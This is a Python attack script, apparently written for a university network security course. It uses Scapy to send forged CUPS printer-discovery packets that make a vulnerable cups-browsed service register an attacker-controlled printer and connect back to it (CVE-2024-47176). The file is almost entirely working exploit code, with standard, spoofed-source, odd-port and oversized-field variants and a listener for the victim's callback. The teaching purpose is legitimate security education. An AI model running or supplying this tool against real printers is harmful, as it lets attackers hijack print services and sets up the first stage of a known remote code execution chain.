#!/usr/bin/env python3
"""
cups_attack.py - CUPS Printer Discovery Attack Tool
DAT510 - Network Security and Vulnerability

Uses Scapy to craft and send custom CUPS printer-discovery packets,
advertising an attacker-controlled virtual printer to a vulnerable
cups-browsed service.

Focus: demonstrating the INSECURE PRINTER DISCOVERY MECHANISM
(CVE-2024-47176). Full remote code execution is NOT the goal.

Usage examples:
  python3 cups_attack.py -t 127.0.0.1 -a 172.30.28.54
  python3 cups_attack.py -t 127.0.0.1 -a 172.30.28.54 --mode all
  python3 cups_attack.py -t 127.0.0.1 -a 172.30.28.54 --mode spoof --count 5
  python3 cups_attack.py -t 127.0.0.1 -a 172.30.28.54 --pcap output.pcap
"""

import argparse
import logging
import os
import sys
import time
from datetime import datetime

from scapy.all import (
    IP, UDP, Raw,
    send, sniff, wrpcap, conf
)

# ─────────────────────────────────────────────
# CONFIGURATION DEFAULTS
# ─────────────────────────────────────────────

CUPS_PORT      = 631    # Standard CUPS/IPP port — where cups-browsed listens
DEFAULT_PORT   = 12345  # Port where our fake printer is advertised

# ─────────────────────────────────────────────
# PACKET BUILDERS
# Each function below builds ONE variation of a
# crafted CUPS printer-discovery UDP packet using Scapy.
# Scapy lets us control every field manually,
# which is not possible with normal socket programming.
# ─────────────────────────────────────────────

def build_standard_packet(attacker_ip, attacker_port, target_ip):
    """
    VARIATION 1 — Standard CUPS browse packet.

    This is the normal format cups-browsed expects to receive on UDP port 631.
    Format: <printer_type_hex> <printer_state_hex> <printer_uri> "<location>" "<info>"

    printer_type  : a hex number describing the printer's capabilities (0 = basic)
    printer_state : 0x03 = idle (printer is ready)
    printer_uri   : the full HTTP address of our fake printer
    location      : a human-readable location string
    info          : a human-readable printer name

    This demonstrates CVE-2024-47176: cups-browsed accepts this packet
    from ANY sender with no authentication.
    """
    printer_uri  = f"http://{attacker_ip}:{attacker_port}/printers/FAKE-PRINTER"
    payload      = f'0 3 {printer_uri} "Lab Room 1" "AttackerPrinter"'

    packet = (
        IP(dst=target_ip) /
        UDP(dport=CUPS_PORT) /
        Raw(load=payload.encode())
    )
    return packet, payload


def build_spoofed_source_packet(attacker_ip, attacker_port, target_ip, spoof_ip):
    """
    VARIATION 2 — Spoofed source IP packet.

    Same discovery packet, but the IP source address is set to a FAKE address
    (spoof_ip) instead of the real attacker IP.

    IP spoofing (setting a fake source address) = pretending the packet
    came from a trusted or unexpected host.

    Scapy makes this easy — we just set IP(src=spoof_ip) manually.
    Normal socket libraries do not allow this.

    This shows the discovery mechanism has no source verification at all.
    """
    printer_uri  = f"http://{attacker_ip}:{attacker_port}/printers/SPOOFED-PRINTER"
    payload      = f'0 3 {printer_uri} "Server Room" "TrustedPrinter"'

    packet = (
        IP(src=spoof_ip, dst=target_ip) /
        UDP(dport=CUPS_PORT) /
        Raw(load=payload.encode())
    )
    return packet, payload


def build_nonstandard_port_packet(attacker_ip, target_ip):
    """
    VARIATION 3 — Printer advertised on a non-standard port.

    Advertises the printer on port 9999 instead of the standard port.
    This tests whether cups-browsed blindly follows whatever port
    is in the announcement, with no validation.

    If cups-browsed connects to port 9999, it confirms that
    any port value in the announcement is accepted without checking.
    """
    nonstandard_port = 9999
    printer_uri  = f"http://{attacker_ip}:{nonstandard_port}/printers/ODDPORT"
    payload      = f'0 3 {printer_uri} "Floor 2" "OddPortPrinter"'

    packet = (
        IP(dst=target_ip) /
        UDP(dport=CUPS_PORT) /
        Raw(load=payload.encode())
    )
    return packet, payload


def build_malformed_packet(attacker_ip, attacker_port, target_ip):
    """
    VARIATION 4 — Malformed / oversized field packet.

    Sends a printer announcement where the location field is
    an abnormally long string (200 characters of 'A').

    This tests how cups-browsed handles unexpected input sizes
    and whether it validates field lengths before processing them.
    A real robust implementation should reject or truncate this.
    """
    long_location = "A" * 200
    printer_uri   = f"http://{attacker_ip}:{attacker_port}/printers/MALFORMED"
    payload       = f'0 3 {printer_uri} "{long_location}" "MalformedPrinter"'

    packet = (
        IP(dst=target_ip) /
        UDP(dport=CUPS_PORT) /
        Raw(load=payload.encode())
    )
    return packet, payload


# ─────────────────────────────────────────────
# SEND AND LOG
# ─────────────────────────────────────────────

sent_packets = []  # keeps all sent packets for PCAP export


def send_packet(packet, description, verbose=True):
    """
    Sends one Scapy packet and records it.
    conf.verb = 0 silences Scapy's own output so only our messages show.
    """
    conf.verb = 0
    send(packet)
    sent_packets.append(packet)

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    msg = f"[{timestamp}] SENT: {description}"

    if verbose:
        print(msg)
    logging.info(msg)


# ─────────────────────────────────────────────
# LISTEN FOR RESPONSE
# After sending the announcement, we listen to see if the
# victim CUPS server connects BACK to our advertised port.
# If it does, it confirms the insecure discovery worked.
# ─────────────────────────────────────────────

def listen_for_response(attacker_ip, attacker_port, timeout=10):
    """
    Listens for incoming TCP connections on our advertised port.
    If cups-browsed receives our UDP announcement, it will
    try to connect back to us on that port to fetch printer info.
    That connection is proof the discovery mechanism worked.
    """
    print(f"\n[*] Listening for victim response on {attacker_ip}:{attacker_port} "
          f"(timeout: {timeout}s)...")

    # BPF filter — Berkeley Packet Filter — a compact syntax for
    # telling the sniffer exactly which packets to capture.
    # Here: only TCP packets destined for our attacker_port.
    bpf_filter = f"tcp and dst port {attacker_port}"

    captured = sniff(filter=bpf_filter, timeout=timeout, count=5)

    if captured:
        print(f"\n[+] VICTIM RESPONDED — {len(captured)} packet(s) received!")
        print("[+] This confirms cups-browsed connected to our fake printer.")
        print("[+] Insecure printer discovery (CVE-2024-47176) demonstrated.\n")
        for pkt in captured:
            print(f"    {pkt.summary()}")
            logging.info(f"Response captured: {pkt.summary()}")
        return True
    else:
        print("\n[-] No response within timeout period.")
        print("[-] cups-browsed may not have processed the announcement yet,")
        print("    or the port is not reachable. Check docker logs for activity.")
        return False


# ─────────────────────────────────────────────
# ATTACK MODES
# ─────────────────────────────────────────────

def run_standard(attacker_ip, attacker_port, target_ip, count, verbose):
    """Mode: standard — sends Variation 1 repeatedly."""
    print(f"\n[*] Mode: STANDARD — sending {count} standard discovery packet(s)")
    print(f"[*] Advertising fake printer at http://{attacker_ip}:{attacker_port}/\n")

    for i in range(count):
        pkt, payload = build_standard_packet(attacker_ip, attacker_port, target_ip)
        send_packet(pkt, f"Standard packet #{i+1} → {target_ip}:{CUPS_PORT} | {payload}", verbose)
        if count > 1:
            time.sleep(0.5)


def run_spoof(attacker_ip, attacker_port, target_ip, spoof_ip, count, verbose):
    """Mode: spoof — sends Variation 2 with a fake source IP."""
    print(f"\n[*] Mode: SPOOF — spoofed source IP = {spoof_ip}")

    for i in range(count):
        pkt, payload = build_spoofed_source_packet(
            attacker_ip, attacker_port, target_ip, spoof_ip)
        send_packet(pkt, f"Spoofed packet #{i+1} → {target_ip}:{CUPS_PORT} | src={spoof_ip}", verbose)
        if count > 1:
            time.sleep(0.5)


def run_variations(attacker_ip, attacker_port, target_ip, verbose):
    """Mode: variations — sends all 4 packet variations once each."""
    print("\n[*] Mode: VARIATIONS — sending all 4 packet variations\n")

    # Variation 1 — standard
    pkt, payload = build_standard_packet(attacker_ip, attacker_port, target_ip)
    send_packet(pkt, f"Variation 1 (Standard)         → {payload[:60]}", verbose)
    time.sleep(1)

    # Variation 2 — spoofed source
    pkt, payload = build_spoofed_source_packet(
        attacker_ip, attacker_port, target_ip, spoof_ip="10.0.0.99")
    send_packet(pkt, f"Variation 2 (Spoofed src IP)   → {payload[:60]}", verbose)
    time.sleep(1)

    # Variation 3 — non-standard port
    pkt, payload = build_nonstandard_port_packet(attacker_ip, target_ip)
    send_packet(pkt, f"Variation 3 (Non-standard port)→ {payload[:60]}", verbose)
    time.sleep(1)

    # Variation 4 — malformed fields
    pkt, payload = build_malformed_packet(attacker_ip, attacker_port, target_ip)
    send_packet(pkt, f"Variation 4 (Malformed fields) → {payload[:60]}...", verbose)


def run_all(attacker_ip, attacker_port, target_ip, spoof_ip, count, verbose):
    """Mode: all — runs standard + spoof + all variations."""
    run_standard(attacker_ip, attacker_port, target_ip, count, verbose)
    time.sleep(1)
    run_spoof(attacker_ip, attacker_port, target_ip, spoof_ip, 1, verbose)
    time.sleep(1)
    run_variations(attacker_ip, attacker_port, target_ip, verbose)


# ─────────────────────────────────────────────
# MAIN — COMMAND LINE INTERFACE
# ─────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description=(
            "cups_attack.py — CUPS Printer Discovery Attack Tool\n"
            "Crafts and sends custom UDP printer-discovery packets using Scapy\n"
            "to demonstrate CVE-2024-47176 (insecure cups-browsed discovery).\n"
            "Full RCE is NOT the goal — only the discovery mechanism is shown."
        ),
        formatter_class=argparse.RawTextHelpFormatter
    )

    # Required
    parser.add_argument("-t", "--target",   required=True,
        help="Target IP address (victim CUPS server), e.g. 127.0.0.1")
    parser.add_argument("-a", "--attacker", required=True,
        help="Attacker IP address (where fake printer runs), e.g. 172.30.28.54")

    # Optional
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT,
        help=f"Port the fake printer is advertised on (default: {DEFAULT_PORT})")
    parser.add_argument("-s", "--spoof", default="10.0.0.99",
        help="Spoofed source IP for the spoof mode (default: 10.0.0.99)")
    parser.add_argument("-c", "--count", type=int, default=1,
        help="Number of packets to send in standard/spoof mode (default: 1)")
    parser.add_argument("-m", "--mode",
        choices=["standard", "spoof", "variations", "all"],
        default="standard",
        help=(
            "Attack mode:\n"
            "  standard   — one normal discovery packet (Variation 1)\n"
            "  spoof      — spoofed source IP packet (Variation 2)\n"
            "  variations — all 4 packet variations once each\n"
            "  all        — standard + spoof + all variations (default: standard)"
        ))
    parser.add_argument("-l", "--listen", action="store_true",
        help="Listen for victim response after sending (confirms discovery worked)")
    parser.add_argument("--timeout", type=int, default=10,
        help="Seconds to wait for victim response when --listen is set (default: 10)")
    parser.add_argument("--pcap",
        help="Save all sent packets to a PCAP file, e.g. --pcap attack_sent.pcap")
    parser.add_argument("--log", default="cups_attack.log",
        help="Log file path (default: cups_attack.log)")
    parser.add_argument("-q", "--quiet", action="store_true",
        help="Suppress packet output (quiet mode)")

    args = parser.parse_args()
    verbose = not args.quiet

    # Logging setup
    logging.basicConfig(
        filename=args.log,
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s"
    )

    # Banner
    print("=" * 60)
    print("  CUPS PRINTER DISCOVERY ATTACK TOOL — cups_attack.py")
    print("  DAT510 Network Security and Vulnerability")
    print("=" * 60)
    print(f"  Target IP   : {args.target}:{CUPS_PORT}")
    print(f"  Attacker IP : {args.attacker}:{args.port}")
    print(f"  Mode        : {args.mode}")
    print(f"  Spoof IP    : {args.spoof}")
    print(f"  Count       : {args.count}")
    print(f"  Listen      : {args.listen}")
    print(f"  PCAP output : {args.pcap if args.pcap else 'None'}")
    print(f"  Log file    : {args.log}")
    print("=" * 60)
    print("\n[!] Only use against isolated lab environments.")
    print("[!] Focus: insecure printer-discovery mechanism (CVE-2024-47176)\n")

    # Run selected mode
    if args.mode == "standard":
        run_standard(args.attacker, args.port, args.target, args.count, verbose)

    elif args.mode == "spoof":
        run_spoof(args.attacker, args.port, args.target,
                  args.spoof, args.count, verbose)

    elif args.mode == "variations":
        run_variations(args.attacker, args.port, args.target, verbose)

    elif args.mode == "all":
        run_all(args.attacker, args.port, args.target,
                args.spoof, args.count, verbose)

    # Summary
    print(f"\n[*] Total packets sent : {len(sent_packets)}")
    logging.info(f"Total packets sent: {len(sent_packets)}")

    # Listen for victim response
    if args.listen:
        listen_for_response(args.attacker, args.port, args.timeout)

    # Save PCAP
    if args.pcap and sent_packets:
        wrpcap(args.pcap, sent_packets)
        print(f"[+] Sent packets saved to PCAP: {args.pcap}")
        logging.info(f"PCAP saved: {args.pcap}")

    print(f"[*] Log saved to: {args.log}\n")


if __name__ == "__main__":
    main()
